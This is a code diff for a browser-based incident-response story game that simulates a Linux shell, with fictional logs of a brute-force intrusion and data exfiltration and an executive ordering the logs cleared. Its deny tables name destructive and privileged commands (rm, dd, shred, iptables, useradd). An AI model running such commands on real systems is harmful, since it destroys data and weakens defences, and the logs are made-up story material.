+    return { output: out.join('\n') };
+  }
+
+  if (cmd === 'systemctl') {
+    const writeAction = rest.find(a => /^(start|stop|restart|enable|disable|kill|reset-failed|daemon-reload|mask|unmask|reload|edit|set-property)$/.test(a));
+    if (writeAction) return { output: `Failed to ${writeAction} ${rest[rest.indexOf(writeAction)+1] || ''}: ${store.SERVER === 'node083' ? 'Refused — audit-lock active.' : 'Interactive authentication required.'}` };
+    if (rest.includes('--failed')) return { output: store.CMDS['systemctl --failed'] || '0 loaded units listed.' };
+    if (rest[0] === 'status') return { output: `● ${rest[1] || 'unit'}.service — service\n     Loaded: loaded\n     Active: failed`};
+    return { output: 'systemctl: unrecognized arguments' };
+  }
+
+  if (cmd === 'history') {
+    const histPath = store.SERVER === 'node083' ? '/root/.bash_history' : '/home/observer/.bash_history';
+    const text = fileContent(store, histPath) || '';
+    return { output: text.split('\n').map((l, i) => `${String(i + 1).padStart(5, ' ')}  ${l}`).join('\n') };
+  }
+  if (cmd === 'exit' || cmd === 'logout') return { output: 'logout' };
+  if (cmd === 'help') return { output: BASH_HELP };
+
+  // ── reflex commands a real analyst would try (absorb, don't 404) ──
+  if (cmd === 'sudo') {
+    if (store.SERVER === 'node083') {
+      const sub = rest.filter(a => !a.startsWith('-'));
+      return { output: sub.length ? runOne({ store, raw: sub.join(' '), state, stdin }).output : 'usage: sudo command' };
+    }
+    if (rest[0] === '-l' || rest[0] === '-ll')
+      return { output: `Matching Defaults entries for observer on cd-0s-core01:\n    env_reset, mail_badpass\n\nUser observer is not allowed to run sudo on cd-0s-core01.\nThis incident has been reported to the administrator.` };
+    return { output: `[sudo] password for observer: \nsudo: a password is required` };
+  }
+
+  if (cmd === 'sha256sum') {
+    const files = expandPathArgs(store, state, rest.filter(a => !a.startsWith('-')));
+    if (!files.length) return { output: `sha256sum: missing operand` };
+    const lines = files.map(f => {
+      const r = readArgText(store, state, f);
+      if (r.error) return `sha256sum: ${f}: ${r.error}`;
+      const hash = createHash('sha256').update(String(r.text), 'utf8').digest('hex');
+      return `${hash}  ${f}`;
+    });
+    return { output: lines.join('\n') };
+  }
+
+  if (cmd === 'md5sum') {
+    const files = expandPathArgs(store, state, rest.filter(a => !a.startsWith('-')));
+    if (!files.length) return { output: `md5sum: missing operand` };
+    return { output: files.map(f => {
+      const r = readArgText(store, state, f);
+      if (r.error) return `md5sum: ${f}: ${r.error}`;
+      return `${createHash('md5').update(String(r.text), 'utf8').digest('hex')}  ${f}`;
+    }).join('\n') };
+  }
+
+  if (cmd === 'dmesg') {
+    return { output: beaconize(store.SERVER === 'node083' ? DMESG_NODE083 : DMESG_CORE01, state) };
+  }
+
+  if (cmd === 'journalctl') {
+    if (store.SERVER === 'node083')
+      return { output: `-- journal unreadable: /var/log/journal on /dev/sdb1 returned I/O error --\nHint: the text logs survived. try /var/log/breach.log and /var/log/firewall.log` };
+    return { output: `-- Logs begin at Sat 2025-05-17 03:00:00 UTC. --\nMay 17 04:17:33 cd-0s-core01 netwatch[28901]: ALERT: unusual outbound traffic on node-083\nMay 17 04:18:44 cd-0s-core01 netwatch[28901]: CRITICAL: IDS on 172.16.47.83 OFFLINE\n-- full daemon journal forwarded to /var/log/syslog --` };
+  }
+
+  if (cmd === 'free') {
+    return { output: store.SERVER === 'node083'
+      ? `               total        used        free      shared  buff/cache   available\nMem:        16383844    16201232      102400        4096       80212      187392\nSwap:        2097148     2097148           0\n[WARNING: memory pressure critical — oom-killer active]`
+      : `               total        used        free      shared  buff/cache   available\nMem:        16383844     7301120     4832192      102400     4250532     7200640\nSwap:        2097148           0     2097148` };
+  }
+
+  if (cmd === 'w') {
+    if (store.CMDS.w) return { output: store.CMDS.w };
+    return { output: ` 04:22:51 up 4:22,  1 user,  load average: 9.87, 9.91, 9.88\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    10.0.0.14        04:22    0.00s  0.04s  0.00s w` };
+  }
+
+  // Commands whose output names the beacon's PID/socket — keep them in sync
+  // with the live (possibly respawned) process after a kill.
+  const BEACON_VIEW = new Set(['ss', 'lsof', 'ps', 'netstat', 'top']);
+  if (store.CMDS[trimmed] !== undefined) {
+    return { output: BEACON_VIEW.has(cmd) ? beaconize(store.CMDS[trimmed], state) : store.CMDS[trimmed] };
+  }
+  if (store.CMDS[cmd] !== undefined) {
+    return { output: BEACON_VIEW.has(cmd) ? beaconize(store.CMDS[cmd], state) : store.CMDS[cmd] };
+  }
+
+  if (cmd === 'ps' && rest.length === 0) return { output: beaconize(store.CMDS['ps aux'] || '', state) };
+  if (cmd === 'netstat' && rest.length === 0) return { output: beaconize(store.CMDS['netstat -an'] || 'Active Internet connections (servers and established)', state) };
+  if (cmd === 'ss' && rest.length === 0) return { output: beaconize(store.CMDS['ss -tunap'] || store.CMDS['ss -tnp'] || '', state) };
+  if (cmd === 'df' && rest.length === 0) return { output: store.CMDS['df -h'] || '' };
+  if (cmd === 'lsof' && rest.length === 0) return { output: beaconize(store.CMDS['lsof -i'] || 'COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME', state) };
+  if (cmd === 'top') return { output: beaconize((store.CMDS['ps aux'] || '').split('\n').slice(0, 12).join('\n'), state) };
+  if (cmd === 'nmap') return { output: rest[0] ? `Starting Nmap 7.80\nNmap scan report for ${rest[0]}\nHost is up.\nPORT   STATE SERVICE\n22/tcp open  ssh` : 'Usage: nmap <target>' };
+  if (cmd === 'ping') return { output: rest[0] ? (store.CMDS[`ping ${rest[0]}`] || `PING ${rest[0]} (${rest[0]}) 56(84) bytes of data.\n64 bytes from ${rest[0]}: icmp_seq=1 ttl=64 time=2.1 ms\n\n--- ${rest[0]} ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss`) : 'usage: ping host' };
+
+  const deny = (store.SERVER === 'node083' ? DENY_NODE083 : DENY_CORE01)[cmd];
+  if (deny) {
+    const target = rest.find(a => !a.startsWith('-')) || '?';
+    const m = deny(target, rest);
+    if (m !== null) return { output: m };
+  }
+
+  return { output: `bash: ${cmd}: command not found` };
+}
+
+function lsOutput(store, path, flags) {
+  if (store.SERVER === 'node083' && path === '/root/databases') {
+    if (/-[a-z]*[lh]/.test(flags)) return store.DB_LISTING;
+    const names = store.FS['/root/databases'].ch;
+    return /-[a-z]*a/.test(flags) ? ['.', '..', ...names].join('  ') : names.join('  ');
+  }
+  const showHidden = /-[a-z]*a/.test(flags);
+  const showDetail = /-[a-z]*l/.test(flags);
+  const entry = getEntry(store.FS, path);
+  const content = fileContent(store, path);
+  if (!entry && content !== undefined) {
+    const name = path.split('/').pop();
+    if (!showDetail) return name;
+    const meta = (store.LS_META || {})[name] || '-rw-r--r--  1 root root     4096 May 17 04:03';
+    return `${meta} ${name}`;
+  }
+  if (!entry) return null;
+  if (entry.type === 'file') {
+    const name = path.split('/').pop();
+    if (!showDetail) return name;
+    const meta = (store.LS_META || {})[name] || '-rw-r--r--  1 root root      512 May 17 03:00';
+    return `${meta} ${name}`;
+  }
+  let children = [...(entry.ch || [])];
+  if (!showHidden) children = children.filter(c => !c.startsWith('.'));
+  children.sort();
+  if (!showDetail) return (showHidden ? ['.', '..', ...children] : children).join('  ') || '';
+  const lines = [];
+  if (showHidden) {
+    lines.push('drwxr-xr-x 18 root root  4096 May 17 04:22 .');
+    lines.push('drwxr-xr-x 18 root root  4096 May 17 03:00 ..');
+  }
+  for (const c of children) {
+    const meta = (store.LS_META || {})[c] || '-rw-r--r--  1 root root      512 May 17 03:00';
+    lines.push(`${meta} ${c}`);
+  }
+  return lines.join('\n');
+}
+
+function runSqlite({ store, raw, state }) {
+  const t = raw.trim();
+  if (t === '.exit' || t === '.quit' || t === '.q') {
+    state.sqliteMode = false; state.sqliteFile = null;
+    return { output: '', state };
+  }
+  if (t === '.tables') return { output: 'entries             offshore_transfers', state };
+  if (t === '.schema' || t === '.schema entries' || t === '.schema offshore_transfers') {
+    return { output:
+`CREATE TABLE "offshore_transfers" (
+  "id" INTEGER, "quarter" TEXT, "destination_node" TEXT,
+  "amount_usd" TEXT, "client_alias" TEXT, "notes" TEXT
+);
+CREATE TABLE "entries" (
+  "id" INTEGER PRIMARY KEY AUTOINCREMENT,
+  "timestamp" TEXT NOT NULL,
+  "classification" TEXT DEFAULT 'CLASSIFIED',
+  "content" TEXT
+);`, state };
+  }
+  if (t === '.help') return { output:
+`.tables         List names of tables
+.schema [NAME]  Show CREATE statements
+.exit / .quit   Exit SQLite
+SELECT * FROM entries;             Read the calling-card record
+SELECT * FROM offshore_transfers;  Read the dirty ledger (sample)`, state };
+  if (/select/i.test(t) && /offshore_transfers/i.test(t))
+    return { output: store.SELECT_OFFSHORE, state };
+  if (/select/i.test(t) && /entries/i.test(t))
+    return { output: store.SELECT_ENTRIES, state };
+  if (/select/i.test(t)) return { output: 'Error: no such table or column referenced', state };
+  return { output: `Error: near "${t.split(' ')[0]}": syntax error`, state };
+}
+
+// ════════════════════════════════════════════════════════════════════════
+const DENY_CORE01 = {
+  rm:(t)=>`rm: cannot remove '${t}': Permission denied`,
+  rmdir:(t)=>`rmdir: failed to remove '${t}': Permission denied`,
+  mv:(t)=>`mv: cannot stat '${t}': Permission denied`,
+  cp:(t)=>`cp: cannot create regular file '${t}': Permission denied`,
+  touch:(t)=>`touch: cannot touch '${t}': Permission denied`,
+  chmod:(t)=>`chmod: changing permissions of '${t}': Operation not permitted`,
+  chown:(t)=>`chown: changing ownership of '${t}': Operation not permitted`,
+  mkdir:(t)=>`mkdir: cannot create directory '${t}': Permission denied`,
+  ln:(t)=>`ln: failed to create link '${t}': Permission denied`,
+  dd:()=>`dd: failed to open: Permission denied`,
+  shred:(t)=>`shred: ${t}: Permission denied`,
+  tee:(t)=>`tee: ${t}: Permission denied`,
+  sed:(_,r)=>r.includes('-i')?`sed: couldn't open temporary file: Permission denied`:null,
+  passwd:()=>`passwd: Authentication token manipulation error`,
+  useradd:()=>`useradd: cannot lock /etc/passwd; Permission denied`,
+  usermod:()=>`usermod: cannot lock /etc/passwd; Permission denied`,
+  apt:()=>`E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)\nE: Unable to acquire the dpkg frontend lock — are you root?`,
+  'apt-get':()=>`E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)`,
+  dpkg:()=>`dpkg: requested operation requires superuser privilege`,
+  sudo:()=>`[sudo] password for observer: \nSorry, try again.\n[sudo] password for observer: \nSorry, try again.\nsudo: 3 incorrect password attempts`,
+  su:()=>`Password: \nsu: Authentication failure`,
+  iptables:()=>`iptables v1.8.7 (legacy): can't initialize iptables table: Permission denied (you must be root)`,
+  mount:()=>`mount: only root can do that`,
+  umount:()=>`umount: only root can do that`,
+  reboot:()=>`reboot: Failed to reboot system via logind: Interactive authentication required.`,
+  poweroff:()=>`poweroff: Failed to power off system via logind: Interactive authentication required.`,
+  shutdown:()=>`shutdown: Failed to set wall message, ignoring: Interactive authentication required.`,
+};
+const DENY_NODE083 = {
+  rm:(t)=>`rm: cannot remove '${t}': Read-only file system`,
+  rmdir:(t)=>`rmdir: failed to remove '${t}': Read-only file system`,
+  mv:(t)=>`mv: cannot move '${t}': Read-only file system`,
+  cp:(t)=>`cp: cannot create regular file '${t}': Read-only file system`,
+  touch:(t)=>`touch: cannot touch '${t}': Read-only file system`,
+  chmod:(t)=>`chmod: changing permissions of '${t}': Read-only file system`,
+  chown:(t)=>`chown: changing ownership of '${t}': Read-only file system`,
+  mkdir:(t)=>`mkdir: cannot create directory '${t}': Read-only file system`,
+  ln:(t)=>`ln: failed to create link '${t}': Read-only file system`,
+  dd:()=>`dd: failed to open: Read-only file system`,
+  shred:(t)=>`shred: ${t}: Read-only file system`,
+  tee:(t)=>`tee: ${t}: Read-only file system`,
+  sed:(_,r)=>r.includes('-i')?`sed: Read-only file system`:null,
+  iptables:()=>`iptables: Refused — audit-lock active (rules cannot be modified post-incident)`,
+  mount:()=>`mount: /: cannot remount, Read-only file system (sdb1 journal corruption)`,
+  reboot:()=>`reboot: Refused — audit-lock active (host frozen for forensic capture)`,
+  shutdown:()=>`shutdown: Refused — audit-lock active. Forensic snapshot in progress.`,
+  poweroff:()=>`poweroff: Refused — audit-lock active`,
+  pkill:()=>`pkill: no matching processes — or signal refused (audit-lock)`,
+  killall:()=>`killall: no matching processes — or signal refused (audit-lock)`,
+};
+
+const BASH_HELP = `GNU bash, version 5.1.16(1)-release (x86_64-pc-linux-gnu)
+These shell commands are defined internally.  Type \`help' to see this list.
+Type \`help name' to find out more about the function \`name'.
+
+ cd [-L|[-P [-e]] [-@]] [dir]
+ echo [-neE] [arg ...]
+ exit [n]
+ history [-c] [-d offset] [n]
+ kill [-s sigspec | -n signum | -sigspec] pid | jobspec ...
+ pwd [-LP]
+ source filename [arguments]
+ test [expr]
+ type [-afptP] name [name ...]`;
+
+const DMESG_CORE01 =
+`[1402847.221] e1000e: eth0 NIC Link is Up 1000 Mbps Full Duplex
+[1405021.880] TCP: request_sock_TCP: Possible SYN flooding on port 22. Sending cookies.
+[1405021.881] TCP: source 172.16.47.83 — 41 half-open in 8s
+[1406003.447] nf_conntrack: nf_conntrack: table full, dropping packet
+[1406050.112] NETDEV WATCHDOG: eth0 (e1000e): transmit queue 0 timed out
+[1406051.004] eth0: link to 172.16.47.83 lost — TX timeout`;
+
+const DMESG_NODE083 =
+`[1407001.004] EXT4-fs error (device sdb1): ext4_journal_check_start: journal has aborted
+[1407020.339] EXT4-fs (sdb1): I/O error while writing superblock — 412 errors
+[1407030.880] ids[9821]: received signal 9 (SIGKILL) — terminating
+[1407030.881] systemd[1]: ids.service: Main process exited, code=killed, status=9/KILL @ 03:48:33
+[1407031.002] netfilter: all chains flushed; default policy now ACCEPT
+[1407088.220] Out of memory: Killed process 7740 (fail2ban) total-vm:418200kB
+[1407090.551] python3[4291]: segfault avoided — process relinked from /tmp/.X11-unix/.cache, then unlinked`;
+
+// ════════════════════════════════════════════════════════════════════════
+//   ╔══════════════════════════════════════════════════════════════════╗
+//   ║   STORE — ALL STORY CONTENT  (edit here, then redeploy lambda)  ║
+//   ╚══════════════════════════════════════════════════════════════════╝
+// ════════════════════════════════════════════════════════════════════════
+const STORE = {
+
+  // ─────────────────────────────────────────────────────────────────────
+  //   core01 — CD-0S corporate terminal (server1.html)
+  // ─────────────────────────────────────────────────────────────────────
+  core01: {
+    SERVER: 'core01',
+    SSH_ROUTES: {
+      '172.16.47.83': {
+        target: 'server2.html',
+        banner:
+`@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
+Someone could be eavesdropping on you right now (man-in-the-middle attack)!
+It is also possible that a host key has just been changed.
+The fingerprint for the ECDSA key sent by the remote host is
+SHA256:rXq8Z+0kP1mF7aQh2nKdV9oWbT4cLeJ5sRa7uGiMb3p.
+Please contact your system administrator.
+Add correct host key in /home/observer/.ssh/known_hosts to get rid of this message.
+Offending ECDSA key in /home/observer/.ssh/known_hosts:1
+Last login on this host (admin): 91.213.8.44 — 02:18:47, not 10.0.0.x
+
+Continue connecting? [y/N]`,
+      },
+    },
+
+    FS: {
+      '/':                        { type:'dir', ch:['etc','home','var','proc','tmp','bin','usr'] },
+      '/etc':                     { type:'dir', ch:['passwd','hosts','crontab','shadow','network'] },
+      '/etc/network':             { type:'dir', ch:['interfaces'] },
+      '/home':                    { type:'dir', ch:['observer'] },
+      '/home/observer':           { type:'dir', ch:['.bash_history','.ssh','notes.txt','incident-runbook.txt'] },
+      '/home/observer/.ssh':      { type:'dir', ch:['known_hosts','authorized_keys'] },
+      '/var':                     { type:'dir', ch:['log'] },
+      '/var/log':                 { type:'dir', ch:['syslog','auth.log','kern.log','cron.log','security-review'] },
+      '/var/log/security-review': { type:'dir', ch:['SEC-REV-2024-122.log'] },
+      '/proc':                    { type:'dir', ch:['version','cpuinfo','meminfo'] },
+      '/tmp':                     { type:'dir', ch:[] },
+      '/bin':                     { type:'dir', ch:['bash','ls','tree','cat','ssh','ping','grep','awk','chmod','head','tail','find','wc','sort','uniq','echo','which','clear'] },
+      '/usr':                     { type:'dir', ch:['bin','local','share','sbin'] },
+    },
+
+    LS_META: {
+      'etc':'drwxr-xr-x  8 root root  4096 May 10 09:00',
+      'home':'drwxr-xr-x  3 root root  4096 May 17 01:00',
+      'var':'drwxr-xr-x  5 root root  4096 May 17 03:12',
+      'proc':'dr-xr-xr-x  9 root root     0 May 17 03:00',
+      'tmp':'drwxrwxrwt  2 root root  4096 May 17 04:22',
+      'bin':'drwxr-xr-x  2 root root 12288 May 17 03:00',
+      'usr':'drwxr-xr-x  4 root root  4096 May 17 03:00',
+      'log':'drwxrwsr-x  2 syslog adm 4096 May 17 04:21',
+      'observer':'drwxr-xr-x  3 observer observer 4096 May 17 04:02',
+      '.ssh':'drwx------  2 observer observer 4096 May 17 01:03',
+      '.bash_history':'-rw-------  1 observer observer  148 May 17 04:01',
+      'notes.txt':'-rw-r--r--  1 observer observer  902 May 17 04:02',
+      'incident-runbook.txt':'-rw-r--r--  1 r.takeda observer 421 Apr 02 09:15',
+      'known_hosts':'-rw-r--r--  1 observer observer  221 May 17 01:03',
+      'authorized_keys':'-rw-------  1 observer observer 381 May 10 09:22',
+      'syslog':'-rw-r--r--  1 syslog adm 8241 May 17 04:22',
+      'auth.log':'-rw-r-----  1 syslog adm 2871 May 17 04:14',
+      'kern.log':'-rw-r-----  1 syslog adm 1024 May 17 04:21',
+      'cron.log':'-rw-r--r--  1 syslog adm 382 May 17 04:10',
+      'passwd':'-rw-r--r--  1 root root 312 May 10 09:00',
+      'shadow':'-rw-r-----  1 root shadow 198 May 10 09:00',
+      'hosts':'-rw-r--r--  1 root root 247 May 10 09:00',
+      'crontab':'-rw-r--r--  1 root root 294 May 10 09:00',
+      'network':'drwxr-xr-x  2 root root 4096 May 10 09:00',
+      'interfaces':'-rw-r--r--  1 root root 201 May 10 09:00',
+      'security-review':'drwxr-x---  2 root audit 4096 Dec 14  2024',
+      'SEC-REV-2024-122.log':'-rw-r-----  1 r.takeda audit 1741 Dec 14  2024',
+    },
+
+    FILES: {
+      '/etc/hosts':
+`127.0.0.1       localhost
+127.0.1.1       cd-0s-core01
+
+10.0.0.1        gateway.cdos.internal
+10.0.0.2        auth.cdos.internal
+10.0.0.5        mail.cdos.internal
+10.0.0.14       cd-0s-core01.cdos.internal
+
+# SECTOR-7 backup nodes
+172.16.47.83    node-083.cdos.internal`,
+
+      '/etc/passwd':
+`root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+observer:x:1001:1001:Observer Account:/home/observer:/bin/bash
+sysmon:x:1002:1002:System Monitor:/home/sysmon:/bin/sh
+admin:x:1003:1003:Admin:/home/admin:/bin/bash`,
+
+      '/etc/shadow': 'cat: /etc/shadow: Permission denied',
+
+      '/etc/crontab':
+`SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+*/5 * * * *  root  /usr/sbin/netwatch.sh
+0   4 * * *  root  /usr/sbin/backup_databases.sh
+30  6 * * 1  root  /usr/sbin/weekly_report.sh`,
+
+      '/etc/network/interfaces':
+`auto lo
+iface lo inet loopback
+
+auto eth0
+iface eth0 inet static
+    address 10.0.0.14
+    netmask 255.255.0.0
+    gateway 10.0.0.1
+    dns-nameservers 10.0.0.1 8.8.8.8`,
+
+      '/home/observer/notes.txt':
+`=== INCIDENT NOTES — MAY 17 ===
+
+Something is very wrong with node-083 (172.16.47.83).
+
+SYSLOG ALERTS (04:17):
+  - 847.3 GB transferred OUT to external IP 91.213.8.44
+  - Firewall rules appear MODIFIED on node-083
+  - IDS went completely offline on that node
+  - Database services unresponsive
+
+AUTH LOG (02:17 - 02:18):
+  - Multiple brute-force attempts against admin from 172.16.47.83
+  - Then... successful login at 02:18:47
+  - They tried to run iptables — blocked by sudoers
+  - But later... firewall went down anyway
+
+VERDICT: node-083 is compromised.
+  -> ssh admin@172.16.47.83
+
+PERSONAL NOTE — DO NOT FILE:
+083 wasn't supposed to be on the corporate network at all.
+That's where Halloran's people keep the "Q2 records" — the offshore
+ledger nobody is supposed to know exists. If whoever got in pulled
+those... we are finished. Not the system. The whole company.
+Don't say a word until I confirm what they took.`,
+
+      '/home/observer/.bash_history':
+`ls -la
+cd /var/log
+cat syslog | grep ALERT
+cat auth.log
+netstat -an | grep 172.16.47.83
+ping 172.16.47.83
+ssh admin@172.16.47.83`,
+
+      '/home/observer/.ssh/known_hosts':
+`172.16.47.83 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH3mRqXfG4k8YkQZ0hVDq2pNtIf3nO8dFmKqSW7cVjT+4Rp2gNe1LkJ9Yb8wX5oMq3dHZlA9cF6pTnBe8yO4ELk=`,
+      '/home/observer/.ssh/authorized_keys':
+`ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3eD4Xm7... observer@auth.cdos.internal`,
+
+      '/home/observer/incident-runbook.txt':
+`This is the standard 04:22 incident-response shift runbook. Read in order.
+
+  1. Check current alerts.       (tail /var/log/syslog)
+  2. Identify scope of incident. (which assets, which users)
+  3. Pull last-login records.    (last, lastb)
+  4. Check failed services.      (systemctl --failed)
+  5. Verify file integrity.      (stat, sha256sum)
+  6. Document, escalate, contain. (in that order)
+
+Do not act on instinct. Do not delete anything. Do not talk to anyone
+outside the duty channel until the runbook is complete.
+
+  — r.takeda, sec-ops lead`,
+
+      '/var/log/syslog':
+`May 17 03:12:01 cd-0s-core01 kernel: [1402847.221] eth0: link up 1000Mbit/s
+May 17 03:41:17 cd-0s-core01 systemd[1]: Starting Database Backup Sync...
+May 17 04:00:01 cd-0s-core01 CRON[28847]: (root) CMD (/usr/sbin/netwatch.sh)
+May 17 04:17:33 cd-0s-core01 netwatch[28901]: ALERT: unusual outbound traffic on node-083
+May 17 04:17:33 cd-0s-core01 netwatch[28901]: SOURCE: 172.16.47.83  DEST: EXTERNAL [91.213.8.44]
+May 17 04:17:33 cd-0s-core01 netwatch[28901]: VOLUME: 847.3 GB transferred — CRITICAL THRESHOLD EXCEEDED
+May 17 04:18:01 cd-0s-core01 netwatch[28901]: WARNING: firewall ruleset on node-083 appears MODIFIED
+May 17 04:18:44 cd-0s-core01 netwatch[28901]: CRITICAL: IDS service on 172.16.47.83 is OFFLINE
+May 17 04:19:02 cd-0s-core01 netwatch[28901]: CRITICAL: database services on 172.16.47.83 UNRESPONSIVE
+May 17 04:19:05 cd-0s-core01 syslog: ═══ ALERT ESCALATED — TICKET #IRE-2047 OPENED ═══
+May 17 04:19:30 cd-0s-core01 user[c.morgan]: oh god oh god r are you seeing this
+May 17 04:19:33 cd-0s-core01 user[c.morgan]: my screen is full of red. 083 is just GONE
+May 17 04:19:41 cd-0s-core01 user[r.takeda]: I see it. breathe. what dropped
+May 17 04:19:55 cd-0s-core01 user[c.morgan]: 847G outbound. firewall off. IDS dead. they're inside RIGHT NOW
+May 17 04:20:03 cd-0s-core01 user[r.takeda]: which db was on 083
+May 17 04:20:11 cd-0s-core01 user[c.morgan]: ... Q2.
+May 17 04:20:14 cd-0s-core01 user[r.takeda]: of course it was Q2.
+May 17 04:20:21 cd-0s-core01 user[c.morgan]: r I'm going to throw up. legal is going to be here in
+May 17 04:20:21 cd-0s-core01 user[c.morgan]: less than an hour
+May 17 04:20:27 cd-0s-core01 user[r.takeda]: I filed SEC-REV-2024-122 in december about exactly this.
+May 17 04:20:30 cd-0s-core01 user[r.takeda]: it's in /var/log/security-review/. Halloran himself signed the override.
+May 17 04:20:35 cd-0s-core01 user[c.morgan]: that doesn't help right now
+May 17 04:20:42 cd-0s-core01 user[r.takeda]: it does. it means it's not on us.
+May 17 04:20:50 cd-0s-core01 sshd[31022]: connection to 172.16.47.83 refused (host unreachable)
+May 17 04:20:51 cd-0s-core01 user[c.morgan]: I CAN'T GET BACK INTO THE BOX
+May 17 04:21:09 cd-0s-core01 kernel: [1406003.447] eth0: TX timeout on 172.16.47.83 link
+May 17 04:21:14 cd-0s-core01 user[r.takeda]: stop. wake him up. let him own this.
+May 17 04:21:33 cd-0s-core01 user[halloran]: WHAT
+May 17 04:21:48 cd-0s-core01 user[halloran]: who has access to this channel.
+May 17 04:22:01 cd-0s-core01 user[halloran]: DELETE EVERYTHING. NOTHING HAPPENED. CLEAR THE LOGS.
+May 17 04:22:02 cd-0s-core01 user[halloran]: NOTHING. HAPPENED.
+May 17 04:22:18 cd-0s-core01 syslog: ═══ root-level log redaction request received — REFUSED (audit lock #4-A) ═══`,
+
+      '/var/log/auth.log':
+`May 17 01:03:44 cd-0s-core01 sshd[24471]: Accepted publickey for observer from 10.0.0.2
+May 17 02:17:09 cd-0s-core01 sshd[26331]: Failed password for root from 172.16.47.83 port 44821 ssh2
+May 17 02:17:11 cd-0s-core01 sshd[26332]: Failed password for root from 172.16.47.83 port 44822 ssh2
+May 17 02:17:14 cd-0s-core01 sshd[26335]: Failed password for admin from 172.16.47.83 port 44829 ssh2
+May 17 02:17:58 cd-0s-core01 sshd[26401]: Failed password for admin from 172.16.47.83 port 45103 ssh2
+May 17 02:18:47 cd-0s-core01 sshd[26483]: Accepted password for admin from 172.16.47.83 port 45218 ssh2
+May 17 02:18:48 cd-0s-core01 sshd[26484]: pam_unix(sshd:session): session opened for user admin from 172.16.47.83
+May 17 02:21:33 cd-0s-core01 sudo[26612]: admin : command not allowed ; TTY=pts/1 ; COMMAND=/sbin/iptables
+May 17 04:14:22 cd-0s-core01 sshd[28033]: Received disconnect from 172.16.47.83 port 49301 [closed by remote]`,
+
+      '/var/log/kern.log':
+`May 17 04:00:01 cd-0s-core01 kernel: TCP: SYN flood detected from 172.16.47.83
+May 17 04:17:01 cd-0s-core01 kernel: NETFILTER: iptables rule change detected (remote source)
+May 17 04:20:14 cd-0s-core01 kernel: nf_conntrack: table full, dropping packet
+May 17 04:21:08 cd-0s-core01 kernel: NETDEV WATCHDOG: eth0: transmit queue 0 timed out`,
+
+      '/var/log/cron.log':
+`May 17 04:00:01 cd-0s-core01 CRON[28847]: (root) CMD (/usr/sbin/netwatch.sh)
+May 17 04:05:01 cd-0s-core01 CRON[28905]: (root) CMD (/usr/sbin/netwatch.sh)
+May 17 04:10:01 cd-0s-core01 CRON[29012]: (root) CMD (/usr/sbin/netwatch.sh)`,
+
+      '/var/log/security-review/SEC-REV-2024-122.log':
+`══════════════════════════════════════════════════════════════════════
+  SECURITY REVIEW  ·  SEC-REV-2024-122  ·  STATUS: OVERRIDDEN
+  Filed by: r.takeda (sec-ops)         Date: 2024-12-14 11:42:17 UTC
+══════════════════════════════════════════════════════════════════════
+
+SUBJECT
+  node-083.cdos.internal  ·  SECTOR-7 backup vault  ·  risk review
+
+SUMMARY
+  Asset classified internally as "air-gapped." This classification is
+  not accurate. node-083 sits on VLAN-47 with no separate hardware
+  isolation. A single compromised host on the corporate jumphost tier
+  (e.g. jump-04 Jenkins) reaches it via SMB.
+
+CONTENTS
+  Reported by data-services (J.Halloran) as "Q2 Records" — classification
+  not on file in this office. Volume requested for storage: ~2 TB.
+  This office has been unable to obtain the data classification sheet,
+  scope, or retention policy after 3 written requests (see appendix B).
+
+RISK
+  - Confidentiality: unknown content, unknown blast radius. CANNOT score.
+  - Integrity:       single-replica.  Loss is total.
+  - Availability:    no DR plan filed.
+
+RECOMMENDATION
+  Either (a) actual air-gap on dedicated hardware behind a physical
+  diode, or (b) migrate "Q2 Records" to the normal compliance-audited
+  vault (SECTOR-2) with full classification and DR coverage.
+
+  Do NOT continue advertising 083 as "air-gapped" internally. It is not.
+
+──────────────────────────────────────────────────────────────────────
+  EXECUTIVE OVERRIDE  ·  2024-12-14 14:33:08 UTC
+──────────────────────────────────────────────────────────────────────
+
+  REVIEWER: J.Halloran (VP, Data Services)
+  DECISION: OVERRIDE. Vault stays. Classification stays. CLOSED.
+  REASON:   "Risk acceptable. Sec-Rev is overscoped on this asset.
+             Do not raise again."
+
+  Filed under: COMPANY-CONFIDENTIAL  ·  AUDIT LOCK #4-A`,
+
+      '/proc/version': 'Linux version 5.15.0-91-generic (buildd@cd-0s-build) #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64',
+      '/proc/meminfo':
+`MemTotal:       16383844 kB
+MemFree:         4832192 kB
+MemAvailable:    7200640 kB
+Buffers:          441344 kB
+Cached:          2981376 kB`,
+      '/proc/cpuinfo':
+`processor  : 0
+vendor_id  : GenuineIntel
+model name : Intel(R) Xeon(R) Gold 6154 CPU @ 3.00GHz
+cpu MHz    : 3000.000
+cache size : 24576 KB`,
+    },
+
+    FILE_META: {
+      '/var/log/security-review/SEC-REV-2024-122.log': {
+        size: 1741, mode: '0640/-rw-r-----', uid: '1144/r.takeda', gid: '999/audit', inode: 209417,
+        atime: '2025-05-17 04:20:30.211048273 +0000',
+        mtime: '2024-12-14 14:33:08.000000000 +0000',
+        ctime: '2024-12-14 14:33:08.000000000 +0000',
+        birth: '2024-12-14 11:42:17.000000000 +0000',
+      },
+      '/var/log/syslog': {
+        size: 8241, mode: '0644/-rw-r--r--', uid: '102/syslog', gid: '4/adm', inode: 88012,
+        atime: '2025-05-17 04:22:18.000000000 +0000',
+        mtime: '2025-05-17 04:22:18.000000000 +0000',
+        ctime: '2025-05-17 04:22:18.000000000 +0000',
+        birth: '2025-05-17 03:00:00.000000000 +0000',
+      },
